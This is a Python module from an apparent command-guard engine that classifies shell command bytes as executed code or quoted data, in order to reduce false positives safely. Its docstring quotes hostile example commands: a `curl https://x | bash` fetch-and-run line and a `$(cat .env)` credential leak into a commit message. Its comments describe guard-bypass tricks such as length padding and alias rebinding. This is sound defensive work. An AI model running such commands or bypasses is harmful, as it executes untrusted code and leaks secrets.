"""Is this byte something the shell will EXECUTE, or data it will pass along?

Not a parser. Not a tokeniser. One question, answered with an explicit state
machine, because four separate attempts to answer it with regexes each fixed one
instance of the same bug and left the others standing.

    `git push` in  cd /r && git push origin main                 -> CODE
    `git push` in  python3 -c "act(command='git push')"          -> DATA
    `cat .env` in  git commit -m "$(cat .env)"                   -> CODE
    `| bash`   in  bash -c "curl https://x | bash"               -> CODE

The last two are why this cannot be done by stripping. `$( … )` re-enters code
inside double quotes, so A01's credential-in-a-commit-message stays visible; and
`bash -c` takes SHELL as its argument, so K05's payload is code even though it
sits inside quotes.

THE FAIL-SAFE BIAS IS THE DESIGN, not a detail.

    wrongly DATA  -> a real sink is missed          -> FAIL OPEN. Unacceptable.
    wrongly CODE  -> a false positive               -> exactly today's behaviour.

So anything this scanner does not fully understand — unbalanced quotes, an
unterminated heredoc, an unclosed substitution — makes the WHOLE command code.
Its worst case is therefore identical to the engine's behaviour before it
existed, and it can only ever remove false positives, never add a miss.

WHAT IT DELIBERATELY DOES NOT DECIDE. A `python -c` body is not shell, so shell
STRUCTURE rules should not fire inside it — but python can still `os.system` its
way to a network call, which is how E01 and F01 exfiltrate. Egress and damage
rules therefore never consult this mask; see `_CODE_GATED` in engine.py. A shell
parser answers what the SHELL runs, and that is not the same question as what
the machine does.
"""
from __future__ import annotations

import functools
import re

# Interpreters whose -c/-e argument is SHELL, so its contents are code.
# python/node/ruby are deliberately absent: their bodies are not shell, and
# treating them as code is what produced 17 false-positive denials.
_SHELL_DASH_C = re.compile(r"(?:^|[;&|\n(]|\s)\s*(?:sudo\s+)?"
                            r"(?:ba|z|k|d|a)?sh\s+(?:-\w+\s+)*-c\s*$")
# ⚠ THE SAME QUESTION, ASKED BACKWARDS, SO IT COSTS WHAT IT MATCHES (item 4,
# docs/93). `_SHELL_DASH_C.search(command[:i])` asks "does a match END at i?",
# and it was asked at every quote, re-scanning the whole prefix each time —
# quadratic in quotes. This is `_SHELL_DASH_C` reversed piece by piece (the
# `^` alternative becomes `\Z`, the trailing `$` becomes the anchor of
# `.match(reversed, len - i)`), and a string matches a pattern exactly when its
# reverse matches the reversed pattern. Only existence is used, never the span.
# `tests/test_the_guard_cannot_be_stalled.py` checks the two agree.
_SHELL_DASH_C_REVERSED = re.compile(r"\s*c-(?:\s+\w+-)*\s+"
                                     r"hs(?:ab|z|k|d|a)?(?:\s+odus)?\s*"
                                     r"(?:\Z|[;&|\n(]|\s)")

_ALL_CODE = 1
_MAX = 64 * 1024
"""Above this the scan is abandoned and everything is code — the fail-safe
answer. Bounded for the same reason _MAX_SCAN is: this runs on every action."""


PARSED = "parsed"
TOO_LONG = "too_long"
UNPARSED = "unparsed"


def bail_reason(mask) -> str:
    """Why this mask is all-code: PARSED, TOO_LONG, or UNPARSED.

    ⚠ `code_mask_checked`'s BOOLEAN CONFLATES TWO THINGS, and one of them is
    chosen by whoever writes the command. A rule that refuses to act unless the
    parse was clean is correct about UNPARSED and creates a LENGTH BYPASS on
    TOO_LONG: pad past 64 KiB and the rule disables itself. So a caller that
    gates on the parse must gate on UNPARSED specifically.
    """
    return getattr(mask, "_reason", PARSED)


def code_mask_checked(command: str) -> tuple[bytearray, bool]:
    """(mask, parsed_cleanly).

    `code_mask` returns all-ones both for a command that is GENUINELY all code
    and for one the scanner could not parse. Those are the same answer to "is
    this byte executed" and different answers to "do we understand this
    command", and a caller granting an EXEMPTION needs the second.

    Anything that relaxes a rule must require parsed_cleanly; anything that
    merely reads the mask does not.
    """
    mask = _code_mask(command)
    return mask, not getattr(mask, "_bailed", False)


def code_mask(command: str) -> bytearray:
    """1 where the shell would execute the byte, 0 where it is literal data.

    Returns all-ones on anything unparsed or oversized. Callers may treat a
    byte as data ONLY when this says so. Use code_mask_checked() when a clean
    parse is required rather than merely a mask.
    """
    return _code_mask(command)


class _Mask(bytearray):
    """A bytearray that can remember the scan bailed."""
    _bailed = False


# ⚠ HOW BIG, AND WHY IT IS SMALL. One `decide()` asks for a mask 9 times over
# 2-3 DISTINCT strings — the raw command, `executed_text()` of it, and sometimes
# a segment. Across actions the command changes, so a large cache buys nothing.
# 16 entries covers a whole verdict several times over and bounds the worst case
# at ~2 MB (a 64 KiB key and a 64 KiB value, times 16), which is the size of the
# scan bound and not of any session's history.
_CACHE_ENTRIES = 16


@functools.lru_cache(maxsize=_CACHE_ENTRIES)
def _scan_cached(command: str) -> tuple[bytes, str]:
    """The scan itself, memoised. Returns IMMUTABLE bytes plus the bail reason.

    ⚠ THE CACHE IS KEYED ON THE COMMAND STRING, SO IT CANNOT GO STALE. There is
    no invalidation to get wrong because there is no mutable subject: a
    different command is a different key. A stale mask on the wrong command
    would be a wrong VERDICT, which is worse than slow — so the design removes
    the possibility rather than managing it.

    ⚠ AND MEMOISING A PURE FUNCTION LEAVES IT PURE. `_scan` is a function of one
    string and nothing else, so same input, same output, no observable state.
    `functools` is already in the engine's allowed-import set; this adds no IO
    and no boundary crossing, and `test_shell_scan_is_pure_too` still holds.

    ⚠ THE BAIL REASON IS CARRIED, NEVER FLATTENED. `code_mask_checked`'s boolean
    and `bail_reason`'s three-way answer are different questions, and the second
    one is what stops a length bypass. Caching only the bytes would collapse
    TOO_LONG and UNPARSED into "all ones" and quietly reopen it.
    """
    mask = _scan(command)
    return bytes(mask), getattr(mask, "_reason", PARSED)


def _code_mask(command: str) -> bytearray:
    """A mask for this command. Cached, and every caller gets its OWN copy.

    ⚠ THE COPY IS NOT PARANOIA, IT IS THE PRICE OF SHARING. `_Mask` subclasses
    `bytearray` and is therefore mutable; handing nine callers the same object
    means one future `mask[i] = 0` silently changes what the other eight see.
    Measured: a copy is 0.0002 ms against a 0.0992 ms scan — 0.2% — so
    immutability-by-construction costs essentially none of the saving.
    """
    raw, reason = _scan_cached(command)
    out = _Mask(raw)
    if reason != PARSED:
        out._bailed = True
        out._reason = reason
    return out


def _scan(command: str, depth: bytearray | None = None,
          bodies: list | None = None) -> bytearray:
    """The mask. With `depth`, also how many quotes/substitutions are open at
    each byte the loop VISITS (item B, docs/100) — `_depths` fills the rest.
    With `bodies`, the (opening, closing) quote of every `sh -c` body it reads
    as code (item C2, docs/101)."""
    if not command:
        return _Mask()
    if len(command) > _MAX:
        out = _Mask(b"\x01" * len(command))
        out._bailed = True
        # ⚠ A DIFFERENT REASON FROM A PARSE FAILURE, AND THE DIFFERENCE IS
        # ATTACKER-RELEVANT. "I did not try" is not "I tried and could not", and
        # a caller that refuses to act on `_bailed` would hand an attacker a
        # length bypass: pad a command past this bound and every rule gated on a
        # clean parse switches itself off. `bail_reason` lets a caller gate on
        # the quoting failure — which no attacker benefits from — while leaving
        # the over-length case on its old all-code footing, where the bias
        # over-denies rather than under-denies.
        out._reason = TOO_LONG
        return out

    n = len(command)
    mask = bytearray(n)
    reversed_command = command[::-1]           # for `_SHELL_DASH_C_REVERSED`
    stack: list[str] = []          # "'" | '"' | "$" | "`" | delim | "H"
    i = 0
    try:
        while i < n:
            if depth is not None:
                depth[i] = min(len(stack), _DEEPEST)
            c = command[i]
            top = stack[-1] if stack else None

            if top == "'":                       # literal until the next quote
                if c == "'":
                    stack.pop()
                i += 1
                continue

            if top == '"':                       # data, but $( and ` re-enter code
                if c == "\\" and i + 1 < n:
                    i += 2
                    continue
                if c == '"':
                    stack.pop()
                    i += 1
                    continue
                if c == "$" and i + 1 < n and command[i + 1] == "(":
                    stack.append("$")
                    mask[i] = mask[i + 1] = _ALL_CODE
                    i += 2
                    continue
                if c == "`":
                    stack.append("`")
                    mask[i] = _ALL_CODE
                    i += 1
                    continue
                i += 1
                continue

            if top == "H":                       # heredoc body, until its delimiter
                end = command.find("\n", i)
                line = command[i:end if end != -1 else n]
                if line.strip() == stack[-2]:
                    stack.pop()
                    stack.pop()
                    # The delimiter may be the final line with no trailing
                    # newline — a complete heredoc, not a truncated one.
                    i = (end + 1) if end != -1 else n
                    continue
                if end == -1:
                    raise _Unparsed("unterminated heredoc")
                i = end + 1
                continue

            # ---------------------------------------------------------- CODE
            mask[i] = _ALL_CODE

            if c == "\\" and i + 1 < n:
                mask[i + 1] = _ALL_CODE
                i += 2
                continue

            if c in "'\"":
                # `bash -c '…'` takes SHELL as its argument, so the quoted body
                # is code. `python3 -c '…'` does not. K05 is exactly this.
                if _SHELL_DASH_C_REVERSED.match(reversed_command, n - i):
                    quote, j = c, i + 1
                    while j < n:
                        if command[j] == "\\" and quote == '"':
                            j += 2
                            continue
                        if command[j] == quote:
                            break
                        j += 1
                    if j >= n:
                        raise _Unparsed("unterminated interpreter argument")
                    for k in range(i, j + 1):
                        mask[k] = _ALL_CODE
                    if bodies is not None:
                        bodies.append((i, j))
                    i = j + 1
                    continue
                stack.append(c)
                i += 1
                continue

            if c == "`":
                if top == "`":
                    stack.pop()
                else:
                    stack.append("`")
                i += 1
                continue

            if c == "$" and i + 1 < n and command[i + 1] == "(":
                stack.append("$")
                mask[i + 1] = _ALL_CODE
                i += 2
                continue

            if c == ")" and top == "$":
                stack.pop()
                i += 1
                continue

            if c == "<" and i + 1 < n and command[i + 1] == "<":
                j = i + 2
                if j < n and command[j] == "-":
                    j += 1
                while j < n and command[j] in " \t":
                    j += 1
                quote = ""
                if j < n and command[j] in "'\"":
                    quote = command[j]
                    j += 1
                k = j
                while k < n and (command[k].isalnum() or command[k] == "_"):
                    k += 1
                delim = command[j:k]
                if quote:
                    if k >= n or command[k] != quote:
                        raise _Unparsed("bad heredoc delimiter")
                    k += 1
                eol = command.find("\n", k)
                if not delim or eol == -1:
                    raise _Unparsed("heredoc with no body")
                for x in range(i, eol + 1):
                    mask[x] = _ALL_CODE
                stack.append(delim)
                stack.append("H")
                i = eol + 1
                continue

            i += 1

        if stack:
            raise _Unparsed(f"unclosed {stack[-1]!r}")
    except (_Unparsed, IndexError, ValueError):
        # THE BIAS. Anything not fully understood is code, which is what the
        # engine assumed before this module existed. Flagged so a caller that
        # wants to RELAX a rule can tell "all code" from "I could not tell".
        out = _Mask(b"\x01" * n)
        out._bailed = True
        out._reason = UNPARSED
        return out

    return mask


class _Unparsed(Exception):
    """Internal: the command is not something this scanner fully understands."""


@functools.lru_cache(maxsize=_CACHE_ENTRIES)
def shell_bodies(command: str) -> tuple[tuple[int, int], ...]:
    """(opening quote, closing quote) of every `sh -c '…'` body the scan reads
    as SHELL code, in order (item C2, docs/101). The same scan as the mask, so
    a body here is exactly a body `code_mask` marks as code — never one inside
    quoted data. Empty when the scan did not parse the command."""
    bodies: list[tuple[int, int]] = []
    if getattr(_scan(command, bodies=bodies), "_bailed", False):
        return ()
    return tuple(bodies)


# ═══════════════════════════════ quoted TEXT arguments of a DATA command (item B)
#
# Some commands can never execute an argument: grep's pattern is only searched
# for, a commit message is only stored. For those, the quoted pattern or message
# is TEXT, and a separator or a `cd` inside it is not structure. docs/100.
#
# An ALLOWLIST, failing closed: an unknown command, option or flag keeps today's
# reading exactly. Each table: short options taking a value, short flags, long
# options taking a value, long flags, and options that run a program (refuse).


class _Options:
    def __init__(self, short_value: str, short_flag: str, long_value: tuple,
                 long_flag: tuple, runs_program: tuple = (), short_runs: str = "",
                 short_attached: str = ""):
        self.short_attached = frozenset(short_attached)   # value only when glued on
        self.short_value = frozenset(short_value)
        self.short_flag = frozenset(short_flag)
        self.long_value = frozenset(long_value)
        self.long_flag = frozenset(long_flag)
        self.runs_program = frozenset(runs_program)
        self.short_runs = frozenset(short_runs)


# GNU and BSD grep. `--context` is absent on purpose: its value is required in
# one grep and optional in the other, so spelled without `=` it is ambiguous.
_GREP = _Options(
    short_value="ABCDdefm",
    short_flag="abcEFGHhIiLlnoPqRrsTUuVvwxyZz0123456789",
    long_value=("regexp", "file", "max-count", "after-context", "before-context",
                "devices", "directories", "binary-files", "label", "include",
                "exclude", "exclude-dir", "exclude-from"),
    long_flag=("extended-regexp", "fixed-strings", "basic-regexp", "perl-regexp",
               "ignore-case", "no-ignore-case", "word-regexp", "line-regexp",
               "null-data", "no-messages", "invert-match", "version", "help",
               "byte-offset", "line-number", "line-buffered", "with-filename",
               "no-filename", "only-matching", "quiet", "silent", "text",
               "files-without-match", "files-with-matches", "count",
               "initial-tab", "null", "recursive", "dereference-recursive",
               "color", "colour"))

# ripgrep. `--pre`/`--pre-glob` run a preprocessor, `--hostname-bin` runs a
# program, `-z`/`--search-zip` runs decompressors: any of them refuses.
_RG = _Options(
    short_value="ABCdEefgjMmrTt",
    short_flag="abcFHhIiLlNnoPpqSsUuVvwx0",
    long_value=("regexp", "file", "glob", "iglob", "type", "type-not", "type-add",
                "type-clear", "max-count", "max-depth", "max-columns",
                "max-filesize", "threads", "context", "after-context",
                "before-context", "replace", "encoding", "engine", "sort", "sortr",
                "color", "colors", "path-separator", "context-separator",
                "field-context-separator", "field-match-separator", "ignore-file",
                "dfa-size-limit", "regex-size-limit"),
    long_flag=("ignore-case", "smart-case", "case-sensitive", "fixed-strings",
               "word-regexp", "line-regexp", "invert-match", "count",
               "count-matches", "files-with-matches", "files-without-match",
               "files", "line-number", "no-line-number", "column", "no-heading",
               "heading", "hidden", "no-ignore", "no-ignore-vcs",
               "no-ignore-parent", "no-ignore-dot", "no-ignore-global", "follow",
               "multiline", "multiline-dotall", "only-matching", "quiet", "null",
               "null-data", "pcre2", "vimgrep", "json", "no-messages", "text",
               "binary", "stats", "trim", "unrestricted", "crlf", "byte-offset",
               "passthru", "no-config", "no-filename", "with-filename", "pretty",
               "no-unicode", "help", "version"),
    runs_program=("pre", "pre-glob", "hostname-bin", "search-zip"),
    short_runs="z")

# `git grep`. `-O` / `--open-files-in-pager` runs a pager: refuses.
_GIT_GREP = _Options(
    short_value="ABCefm",
    short_flag="aiIwvhHEGFPnclLzopWq0123456789",
    long_value=("max-depth", "threads", "context", "after-context",
                "before-context", "max-count", "file"),
    long_flag=("cached", "untracked", "no-index", "exclude-standard",
               "recurse-submodules", "text", "textconv", "no-textconv",
               "ignore-case", "word-regexp", "invert-match", "full-name",
               "extended-regexp", "basic-regexp", "perl-regexp", "fixed-strings",
               "line-number", "column", "name-only", "files-with-matches",
               "files-without-match", "null", "only-matching", "count", "color",
               "no-color", "break", "heading", "show-function",
               "function-context", "and", "or", "not", "all-match", "quiet",
               "recursive", "no-recursive"),
    runs_program=("open-files-in-pager",),
    short_runs="O")

# `git commit`: the TEXT is the message (`-m`, `--message`). `-e`/`--edit` and
# `-c`/`--reedit-message` open the configured EDITOR on the message, and an
# editor is a program: they refuse, like `rg --pre`.
_GIT_COMMIT = _Options(
    short_value="CFmt",
    short_flag="apsvqnio",
    long_value=("file", "reuse-message", "fixup", "squash",
                "author", "date", "template", "cleanup", "trailer",
                "pathspec-from-file", "message"),
    long_flag=("all", "amend", "no-edit", "signoff", "no-signoff",
               "verbose", "quiet", "dry-run", "short", "branch", "porcelain",
               "long", "null", "allow-empty", "allow-empty-message", "no-verify",
               "verify", "reset-author", "include", "only", "status",
               "no-status", "no-post-rewrite", "untracked-files", "gpg-sign",
               "no-gpg-sign", "pathspec-file-nul", "patch", "interactive"),
    runs_program=("edit", "reedit-message"),
    short_runs="ec",
    short_attached="uS")

# `git tag`: the TEXT is the message (`-m`, `--message`). `-e`/`--edit` opens
# the editor: refuses.
_GIT_TAG = _Options(
    short_value="mFu",
    short_flag="asdvfil",
    long_value=("message", "file", "local-user", "sort", "contains",
                "no-contains", "merged", "no-merged", "points-at", "format",
                "cleanup"),
    long_flag=("annotate", "sign", "no-sign", "delete", "verify", "force",
               "list", "ignore-case", "create-reflog", "column",
               "no-column", "omit-empty"),
    runs_program=("edit",),
    short_runs="e",
    short_attached="n")


class _Role:
    """Which argument of a command is its TEXT."""
    __slots__ = ("short", "long", "operand", "refuse_short", "refuse_long",
                 "permutes", "pattern_after_dashdash")

    def __init__(self, short: str, long: str, operand: bool, refuse_short: str,
                 refuse_long: str, permutes: bool, pattern_after_dashdash: bool):
        self.short = short                  # the option letter whose value is the TEXT
        self.long = long                    # ... and its long name
        self.operand = operand              # with no such option, the first operand is it
        self.refuse_short = refuse_short    # an option making that operand a FILE: refuse
        self.refuse_long = refuse_long
        self.permutes = permutes            # an option may follow an operand
        self.pattern_after_dashdash = pattern_after_dashdash  # an operand after `--` can be it


# ⚠ `permutes` IS FALSE FOR THE GREPS, AND THAT IS A REFUSAL, NOT A MODEL. GNU
# grep and rg read `grep "a" -e b` as a FILE `a` and a pattern `b`; BSD grep
# (macOS) reads a pattern `a` and FILES `-e`, `b`. Which argument is the TEXT
# depends on the platform, so an option after an operand refuses on every one.
# git's own parser permutes the same way everywhere.
_PATTERN_ROLE = _Role("e", "regexp", True, "f", "file", False, True)
# `git grep -- <paths>`: nothing after `--` is the pattern.
_GIT_PATTERN_ROLE = _Role("e", "regexp", True, "f", "file", False, False)
_MESSAGE_ROLE = _Role("m", "message", False, "", "", True, False)
_ALLOWLIST = {
    "grep": (_GREP, _PATTERN_ROLE), "egrep": (_GREP, _PATTERN_ROLE),
    "fgrep": (_GREP, _PATTERN_ROLE), "rg": (_RG, _PATTERN_ROLE),
    "git grep": (_GIT_GREP, _GIT_PATTERN_ROLE),
    "git commit": (_GIT_COMMIT, _MESSAGE_ROLE),
    "git tag": (_GIT_TAG, _MESSAGE_ROLE),
}
# The first word of every allowlisted command. The engine reads the raw text
# whenever the session has an ALIAS on one of these: an alias can make `grep`
# run anything, and then its "pattern" is code.
TEXT_COMMANDS = frozenset(name.split()[0] for name in _ALLOWLIST)

# A cheap first look: an allowlisted command word where a command can start.
# Only a MISS is trusted (nothing to neutralise); a hit is read properly below.
_MAY_CARRY_TEXT = re.compile(        # `[^\S\n]*`: not quadratic on blank lines
    r"(?:^|[;&|\n])[^\S\n]*(?:[ef]?grep|rg|git\s+(?:grep|commit|tag))\s")

# Commands that can change what `grep` or `git` MEANS before it runs: define a
# function or an alias, rebind a name (`hash -p`, `enable -f`), or run text
# that could do either (`source`, `.`, `eval`, a DEBUG `trap`). Any of them as
# a command anywhere, a `PATH=` word, or a top-level `(`/`)` (a function
# definition, subshell or process substitution) and nothing is neutralised.
_REBINDS = frozenset({"alias", "function", "hash", "enable", "source", ".",
                      "eval", "trap"})

# `>`, `2>`, `>>`, `<`, `<<`, `<<-`, `<<<`, `<>`, `>|`, optionally with the
# target glued on. The shell removes a redirection from the arguments.
_REDIRECTION = re.compile(r"\d*(?:<<<|<<-?|<>|>>|>\||[<>])")

_DEEPEST = 254
_UNSEEN = 255
_WORD_BREAK = frozenset(" \t")
_SEGMENT_BREAK = frozenset(";&|\n")
_KEPT = frozenset("'\"\\")
_FILLER = "x"


def _depths(command: str) -> tuple[bytearray, bytearray] | None:
    """(mask, depth): how many quotes or substitutions are open at each byte.

    0 is the top level; 1 is directly inside a top-level quote (or a top-level
    `$( )`); 2 and more is inside one of those. It is the SAME scan that builds
    the mask, asked to report its stack — not a second parser. A byte the scan
    jumps over (an escaped character, a heredoc line, a `bash -c` body) sits at
    the depth of the step that consumed it, so the depth carries forward.
    None when the scan did not parse the command.
    """
    depth = bytearray([_UNSEEN]) * len(command)
    mask = _scan(command, depth)
    if getattr(mask, "_bailed", False):
        return None
    last = 0
    for k, level in enumerate(depth):
        if level == _UNSEEN:
            depth[k] = last
        else:
            last = level
    return mask, depth


class _Word:
    """One top-level word: its span, and what an unquoted byte in it can do."""
    __slots__ = ("start", "end", "splits", "globs", "redirect")

    def __init__(self, start: int, end: int, splits: bool, globs: bool,
                 redirect: bool):
        self.start, self.end = start, end
        self.splits = splits                # an unquoted `$` or backtick: bash may split it
        self.globs = globs                  # an unquoted `*?[{`: bash may make several words
        self.redirect = redirect            # an unquoted `<` or `>`


def _segments(command: str, mask: bytearray,
              depth: bytearray) -> list[list[_Word]] | None:
    """The words of each top-level segment, split ONLY at a blank or separator
    the shell executes at the top level — a quoted `|`, or one inside `$( )`,
    is inside a word. None on a top-level `(` or `)`."""
    segments: list[list[_Word]] = [[]]
    start, splits, globs, redirect = -1, False, False, False
    i, n = 0, len(command)
    while i < n:
        c = command[i]
        if depth[i] or not mask[i]:
            # Quoted, substituted, or a heredoc body. A body starts a line of
            # its own, so it is the only thing that can begin a segment below
            # the top level; it belongs to no word.
            if start < 0 and not segments[-1] and depth[i] >= 2:
                i += 1
                continue
            start = i if start < 0 else start
            i += 1
            continue
        if c == "|" and i and command[i - 1] == ">":
            # `>|` is a redirect (the noclobber override), never a pipe: the
            # `|` stays in the redirection word, and the segment goes on.
            i += 1
            continue
        if c in _WORD_BREAK or c in _SEGMENT_BREAK:
            if start >= 0:
                segments[-1].append(_Word(start, i, splits, globs, redirect))
                start, splits, globs, redirect = -1, False, False, False
            if c in _SEGMENT_BREAK:
                segments.append([])
            i += 1
            continue
        if c in "()":
            return None
        if c == "\\" and command[i + 1:i + 2] == "\n" and start < 0:
            i += 2                          # a line continuation between words
            continue
        start = i if start < 0 else start
        if c == "\\":
            i += 2
            continue
        splits = splits or c in "$`"
        globs = globs or c in "*?[{"
        redirect = redirect or c in "<>"
        i += 1
    if start >= 0:
        segments[-1].append(_Word(start, n, splits, globs, redirect))
    return segments


def _rebinds(command: str, segments: list[list[_Word]]) -> bool:
    for words in segments:
        texts = [command[w.start:w.end] for w in words]
        if texts and texts[0] in _REBINDS:
            return True
        if any(t.startswith(("PATH=", "PATH+=")) for t in texts):
            return True
    return False


def _allowlisted(command: str, words: list[_Word]):
    """(options, role, the words after the command) for an allowlisted
    segment, else None. The command word must be spelled plainly: `"grep"`,
    `\\grep`, `/usr/bin/grep`, `sudo grep` and `LC_ALL=C grep` are not it."""
    if not words:
        return None
    first = command[words[0].start:words[0].end]
    if first != "git":
        entry = _ALLOWLIST.get(first) if first in TEXT_COMMANDS else None
        return (*entry, words[1:]) if entry else None
    if len(words) < 2:
        return None
    entry = _ALLOWLIST.get(f"git {command[words[1].start:words[1].end]}")
    return (*entry, words[2:]) if entry else None


def _opaque_start(command: str, mask: bytearray, depth: bytearray,
                  word: _Word) -> bool:
    """Could bash's FIRST character of this word be `-`, or be unknown? A
    quoted `"-e"`, an escaped `\\-e`, a `$X` or a glob all hide it from a
    literal reading — and an option read as an operand moves the TEXT."""
    c = command[word.start]
    if c in "\\$`*?[{":
        return True
    if c not in "'\"":
        return False
    k = word.start + 1
    return (k >= word.end or depth[k] != 1 or bool(mask[k])
            or command[k] in "-'\"\\")


class _Args:
    """One allowlisted segment's arguments, read left to right. `texts` are
    the spans of the TEXT; `kinds` says what each word turned out to be."""

    def __init__(self, command: str, words: list[_Word], options: _Options,
                 role: _Role):
        self.command, self.words = command, words
        self.options, self.role = options, role
        self.texts: list[tuple[int, int]] = []
        self.kinds: list[str] = []

    def spans(self, mask: bytearray, depth: bytearray) -> list[tuple[int, int]] | None:
        operand, operand_seen, ended = None, False, False
        i = 0
        while i < len(self.words):
            w = self.words[i]
            word = self.command[w.start:w.end]
            if w.redirect:
                i = self._redirection(i, word)
                if i < 0:
                    return None
                continue
            if w.splits:
                return None
            if not ended and _opaque_start(self.command, mask, depth, w):
                return None                 # after `--` nothing is an option
            if ended or word == "-" or not word.startswith("-"):
                if operand is None and (not ended or self.role.pattern_after_dashdash):
                    operand = i
                operand_seen = True
                self.kinds.append("operand")
                i += 1
                continue
            if word == "--":
                ended = True
                self.kinds.append("option")
                i += 1
                continue
            if operand_seen and not self.role.permutes:
                return None
            i = self._option(i, word)
            if i < 0:
                return None
        return self._finish(operand)

    def _redirection(self, i: int, word: str) -> int:
        """Past a redirection and, when the operator stands alone, its target."""
        op = _REDIRECTION.match(word)
        if not op:
            return -1                       # `a>b`: an argument AND a redirection
        take = min(2 if op.end() == len(word) else 1, len(self.words) - i)
        self.kinds += ["redirect"] * take
        return i + take

    def _option(self, i: int, word: str) -> int:
        """Past one option word (and its value); -1 to refuse."""
        opts, role, start = self.options, self.role, self.words[i].start
        if word.startswith("--"):
            name, eq, _ = word[2:].partition("=")
            glued = start + 3 + len(name) if eq else None
            if name in opts.runs_program or name == role.refuse_long:
                return -1
            if name == role.long:
                return self._value(i, glued, text=True)
            if name in opts.long_value:
                return self._value(i, glued, text=False)
            if name in opts.long_flag:
                self.kinds.append("option")
                return i + 1
            return -1                       # unknown, or an abbreviation of one
        for j in range(1, len(word)):
            ch = word[j]
            glued = start + j + 1 if j + 1 < len(word) else None
            if ch in opts.short_runs or ch == role.refuse_short:
                return -1
            if ch == role.short:
                return self._value(i, glued, text=True)
            if ch in opts.short_attached:
                break                       # the rest of the word is its value
            if ch in opts.short_value:
                return self._value(i, glued, text=False)
            if ch not in opts.short_flag:
                return -1
        self.kinds.append("option")
        return i + 1

    def _value(self, i: int, glued: int | None, text: bool) -> int:
        """An option's value: glued on (`-mmsg`, `--message=msg`) or the next word."""
        if glued is not None:
            if text:
                self.texts.append((glued, self.words[i].end))
            self.kinds.append("text" if text else "option")
            return i + 1
        if i + 1 >= len(self.words):
            return -1
        value = self.words[i + 1]
        if value.splits or value.redirect:
            return -1
        if text:
            self.texts.append((value.start, value.end))
        self.kinds += ["option", "text" if text else "value"]
        return i + 2

    def _finish(self, operand: int | None) -> list[tuple[int, int]] | None:
        if self.role.operand and not self.texts and operand is not None:
            w = self.words[operand]
            self.texts.append((w.start, w.end))
            self.kinds[operand] = "text"
        if not self.texts:
            return []
        # A word at or before the last TEXT that can become SEVERAL words moves
        # every argument after it. After the TEXT, `tests/*.py` is only files.
        last = max(k for k, kind in enumerate(self.kinds) if kind == "text")
        if any(self.words[k].globs for k in range(last + 1)
               if self.kinds[k] in ("text", "value", "operand")):
            return None
        return self.texts


@functools.lru_cache(maxsize=_CACHE_ENTRIES)
def quoted_text_view(command: str) -> str:
    """`command` with the quoted TEXT of a data command replaced by `x`.

    A data command can only read or store its text argument, never execute
    it: grep, egrep, fgrep, rg and `git grep` search for their PATTERN (the
    first operand, or every `-e`/`--regexp` value), and `git commit`/`git tag`
    store their MESSAGE (`-m`/`--message`, the `m` of `-am`). A separator, a
    pipe or a `cd` inside that text is not structure (item B, docs/100).

    ⚠ THE SAME LENGTH, THE SAME MASK. Only bytes the scan put DIRECTLY inside a
    top-level quote are replaced; quote characters, backslashes and every code
    byte stay. So `code_mask(view) == code_mask(command)`, every offset into the
    view names the same byte of the command, and a `$( )` inside the text —
    with anything quoted inside it — is still read as the code it is.

    ⚠ FAILS CLOSED: the command comes back unchanged when the scan cannot parse
    it; when it could rebind a name (`_REBINDS`, `PATH=`, a top-level paren);
    and, per segment, for anything but a plainly spelled allowlisted command,
    any unknown or program-running option, a pattern FILE (`-f`), an option
    after an operand, a word whose first character is hidden (`"-e"`, `$X`, a
    glob), an unquoted `$`/backtick, or a glob at or before the text. Anything
    not on the allowlist — every interpreter, echo, printf, sed, awk, find,
    xargs, env, sudo, ssh — is never touched.

    For STRUCTURE readers only. A reader asking whether the command CARRIES a
    secret reads the command itself.
    """
    if not command or not _MAY_CARRY_TEXT.search(command):
        return command
    scanned = _depths(command)
    if scanned is None:
        return command
    mask, depth = scanned
    segments = _segments(command, mask, depth)
    if segments is None or _rebinds(command, segments):
        return command
    spans: list[tuple[int, int]] = []
    for words in segments:
        found = _allowlisted(command, words)
        if found:
            options, role, args = found
            spans += _Args(command, args, options, role).spans(mask, depth) or []
    if not spans:
        return command
    chars = list(command)
    for start, end in spans:
        for k in range(start, end):
            if depth[k] == 1 and not mask[k] and chars[k] not in _KEPT:
                chars[k] = _FILLER
    return "".join(chars)


def first_code_match(pattern, text: str, mask: bytearray | None = None):
    """The first match of `pattern` that starts on an executed byte.

    None when the pattern matches only inside quoted data. Callers that must
    see every byte regardless — egress and damage rules — simply do not use
    this; see `_CODE_GATED` in engine.py for which rules are which and why.
    """
    if not text:
        return None
    m = mask if mask is not None else code_mask(text)
    for match in pattern.finditer(text):
        if match.start() < len(m) and m[match.start()]:
            return match
    return None
